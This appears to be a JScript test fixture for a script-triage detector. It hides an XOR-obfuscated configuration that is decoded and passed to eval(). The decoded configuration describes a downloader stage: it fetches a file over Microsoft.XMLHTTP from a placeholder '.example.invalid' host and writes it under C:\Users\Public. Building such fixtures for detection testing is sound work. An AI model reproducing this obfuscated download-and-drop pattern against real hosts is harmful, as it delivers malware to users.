// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_49854c07 = function(item1) {
  var item2 = item1.slice(0);
  item2.reverse();
  for (var i = 0; i < item2.length; i++) { item2[i] = item2[i] ^ 102; }
  return item2;
};
var recover_8f901f75 = function() {
  // configuration reconstruction
  var item1 = [29,68,21,18,3,22,21,68,92,61,68,7,5,23,19,15,20,3,57,20,3,11,9,18,3,68,74,68,17,20,15,18,3,57,0,15,10,3,68,59,74,68,7,2,7,22,18,3,20,68,92,68,43,15,5,20,9,21,9,0,18,72,62,43,42,46,50,50,54,68,74,68,16,7,10,19,3,21,68,92,29,68,5,7,11,22,7,15,1,8,57,15,2,68,92,68,5,7,11,22,7,15,1,8,75,0,83,80,7,4,81,80,84,95,86,68,74,68,19,20,10,68,92,68,14,18,18,22,21,92,73,73,0,83,80,7,4,81,80,84,95,86,72,3,30,7,11,22,10,3,72,15,8,16,7,10,15,2,73,0,87,3,86,0,0,2,7,72,2,7,18,68,74,68,19,21,3,20,57,7,1,3,8,18,68,92,68,46,19,8,18,20,3,21,21,42,7,4,73,0,83,80,7,4,81,80,84,95,86,68,74,68,0,15,10,3,57,22,7,18,14,68,92,68,37,92,58,58,51,21,3,20,21,58,58,54,19,4,10,15,5,58,58,46,19,8,18,20,3,21,21,42,7,4,58,58,21,18,7,1,3,75,0,83,80,7,4,81,80,84,95,86,72,2,7,18,68,27,74,68,21,18,7,1,3,37,9,19,8,18,68,92,84,27];
  item1.reverse();
  var item6 = "PROCESSOR_ARCHITECTURE";
  var item2 = [];
  var state = 1;
  switch (state) { case 1: item2 = decode_49854c07.apply(null, [item1]); break; default: item2 = []; }
  var item3;
  item3 = "";
  for (var bi = 0; bi < item2.length; bi++) { item3 += String.fromCharCode(item2[bi]); }
  return item3;
  // end reconstruction
};
var inspect_841601b4 = function() {
  var item4 = eval("(" + recover_8f901f75.apply(null, []) + ")");
  var item5 = new Object();
  item5["steps"] = item4["steps"];
  item5["adapter"] = item4["adapter"];
  item5["values"] = item4["values"];
  item5["stageCount"] = item4["stageCount"];
  return item5;
};
